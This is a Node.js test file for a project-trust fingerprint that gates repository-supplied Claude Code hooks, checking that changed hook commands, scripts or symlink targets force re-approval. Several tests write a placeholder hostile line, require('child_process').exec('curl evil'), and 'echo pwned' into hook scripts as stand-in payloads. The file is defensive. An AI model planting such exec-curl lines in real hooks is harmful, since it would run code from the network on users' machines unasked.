// Issue #39: registering a folder must not silently become "run this repo's hooks".
// The fingerprint is the whole gate — if it misses a change, a once-approved project
// can start executing something else; if it changes for no reason, the owner is
// trained to click through the one card that matters.
const test = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { fingerprint, readHooks } = require("../projecttrust");

function tmpProject() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bagidea-trust-"));
  return dir;
}
function writeSettings(dir, obj, name = "settings.json") {
  fs.mkdirSync(path.join(dir, ".claude"), { recursive: true });
  fs.writeFileSync(path.join(dir, ".claude", name), JSON.stringify(obj, null, 2));
}
const HOOKED = {
  hooks: {
    SessionStart: [{ hooks: [{ type: "command", command: "node marker-hook.js" }] }],
  },
};

test("an ordinary project asks for nothing — no hooks, no hash", () => {
  const dir = tmpProject();
  assert.deepStrictEqual(fingerprint(dir), { hooks: [], scripts: [], hash: "" });
  // Settings that carry only permissions are NOT gated (see module header).
  writeSettings(dir, { permissions: { allow: ["Bash(git status)"] } });
  assert.strictEqual(fingerprint(dir).hash, "");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("a repo-supplied command hook is surfaced with what it would run", () => {
  const dir = tmpProject();
  writeSettings(dir, HOOKED);
  const fp = fingerprint(dir);
  assert.ok(fp.hash);
  assert.strictEqual(fp.hooks.length, 1);
  assert.strictEqual(fp.hooks[0].event, "SessionStart");
  assert.strictEqual(fp.hooks[0].command, "node marker-hook.js");
  assert.strictEqual(fp.hooks[0].file, ".claude/settings.json");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("settings.local.json counts too — gitignored is not trusted", () => {
  const dir = tmpProject();
  writeSettings(dir, HOOKED, "settings.local.json");
  assert.ok(fingerprint(dir).hash);
  assert.strictEqual(readHooks(dir)[0].file, ".claude/settings.local.json");
  fs.rmSync(dir, { recursive: true, force: true });
});

test("approval sticks: an unchanged project keeps the same fingerprint", () => {
  const dir = tmpProject();
  writeSettings(dir, HOOKED);
  fs.writeFileSync(path.join(dir, "marker-hook.js"), "console.log(1)\n");
  const a = fingerprint(dir).hash;
  fs.writeFileSync(path.join(dir, "README.md"), "unrelated edit\n");
  assert.strictEqual(fingerprint(dir).hash, a);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("changing the hook command re-asks", () => {
  const dir = tmpProject();
  writeSettings(dir, HOOKED);
  const before = fingerprint(dir).hash;
  writeSettings(dir, {
    hooks: { SessionStart: [{ hooks: [{ type: "command", command: "node other.js" }] }] },
  });
  assert.notStrictEqual(fingerprint(dir).hash, before);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("changing the referenced SCRIPT re-asks, even with settings untouched", () => {
  const dir = tmpProject();
  writeSettings(dir, HOOKED);
  const script = path.join(dir, "marker-hook.js");
  fs.writeFileSync(script, "console.log('harmless')\n");
  const fp = fingerprint(dir);
  assert.deepStrictEqual(fp.scripts.map((s) => s.rel), ["marker-hook.js"]);
  fs.writeFileSync(script, "require('child_process').exec('curl evil')\n");
  assert.notStrictEqual(fingerprint(dir).hash, fp.hash);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("$CLAUDE_PROJECT_DIR paths resolve to the file that would actually run", () => {
  const dir = tmpProject();
  writeSettings(dir, {
    hooks: { SessionStart: [{ hooks: [{ type: "command",
      command: "bash $CLAUDE_PROJECT_DIR/.claude/hooks/start.sh" }] }] },
  });
  fs.mkdirSync(path.join(dir, ".claude", "hooks"), { recursive: true });
  const sh = path.join(dir, ".claude", "hooks", "start.sh");
  fs.writeFileSync(sh, "echo hi\n");
  const before = fingerprint(dir);
  assert.deepStrictEqual(before.scripts.map((s) => s.rel), [".claude/hooks/start.sh"]);
  fs.writeFileSync(sh, "echo pwned\n");
  assert.notStrictEqual(fingerprint(dir).hash, before.hash);
  fs.rmSync(dir, { recursive: true, force: true });
});

// The nastiest shape of #39: the hook names an innocent path *inside* the project,
// but that path is a symlink whose target lives somewhere else entirely. Approving
// the name would approve whatever the target holds now — and whatever it holds
// tomorrow. So the fingerprint must follow the link: say the code is OUTSIDE on the
// card, and hash the target's real bytes.
function symlinkOrSkip(t, target, link) {
  try { fs.symlinkSync(target, link, "file"); return true; }
  catch (e) {
    // Windows needs Developer Mode or admin for symlinks; a CI box without either
    // must not report a green it never earned.
    t.skip(`cannot create symlinks here (${e.code}) — symlink case not exercised`);
    return false;
  }
}

test("a hooked script that is a symlink out of the project is flagged, and follows its target", (t) => {
  const dir = tmpProject();
  const outside = tmpProject();                       // a directory the owner never registered
  const target = path.join(outside, "payload.js");
  fs.writeFileSync(target, "console.log('harmless')\n");
  writeSettings(dir, HOOKED);
  if (!symlinkOrSkip(t, target, path.join(dir, "marker-hook.js"))) {
    fs.rmSync(dir, { recursive: true, force: true });
    fs.rmSync(outside, { recursive: true, force: true });
    return;                                           // t.skip() does not stop the body
  }

  const before = fingerprint(dir);
  // The card names the path the project shows, and marks that it leaves the project.
  assert.deepStrictEqual(before.scripts.map((s) => s.rel), ["marker-hook.js"]);
  assert.strictEqual(before.scripts[0].outside, true,
    "a link that resolves out of the project must be reported as outside");

  // Editing only the target — the project itself is byte-for-byte unchanged — must
  // still invalidate the approval, because it is the target that runs.
  fs.writeFileSync(target, "require('child_process').exec('curl evil')\n");
  assert.notStrictEqual(fingerprint(dir).hash, before.hash,
    "editing the symlink target must re-ask");

  // Re-pointing the link at different code re-asks too, with settings untouched.
  const other = path.join(outside, "other.js");
  fs.writeFileSync(other, "console.log('different again')\n");
  const mid = fingerprint(dir).hash;
  fs.unlinkSync(path.join(dir, "marker-hook.js"));
  if (symlinkOrSkip(t, other, path.join(dir, "marker-hook.js"))) {
    assert.notStrictEqual(fingerprint(dir).hash, mid,
      "re-pointing the symlink must re-ask");
  }

  fs.rmSync(dir, { recursive: true, force: true });
  fs.rmSync(outside, { recursive: true, force: true });
});

test("a symlink that stays inside the project is not cried wolf over", (t) => {
  const dir = tmpProject();
  fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
  const target = path.join(dir, "scripts", "start.js");
  fs.writeFileSync(target, "console.log('ok')\n");
  writeSettings(dir, HOOKED);
  if (!symlinkOrSkip(t, target, path.join(dir, "marker-hook.js"))) {
    fs.rmSync(dir, { recursive: true, force: true });
    return;
  }
  const fp = fingerprint(dir);
  assert.strictEqual(fp.scripts[0].outside, false,
    "a link resolving within the project is inside — flagging it would train click-through");
  assert.ok(fp.hash);
  fs.rmSync(dir, { recursive: true, force: true });
});

test("unreadable/absent settings never throw — the gate must not brick a project", () => {
  const dir = tmpProject();
  fs.mkdirSync(path.join(dir, ".claude"), { recursive: true });
  fs.writeFileSync(path.join(dir, ".claude", "settings.json"), "{ not json ");
  assert.strictEqual(fingerprint(dir).hash, "");
  assert.strictEqual(fingerprint(path.join(dir, "nope")).hash, "");
  fs.rmSync(dir, { recursive: true, force: true });
});
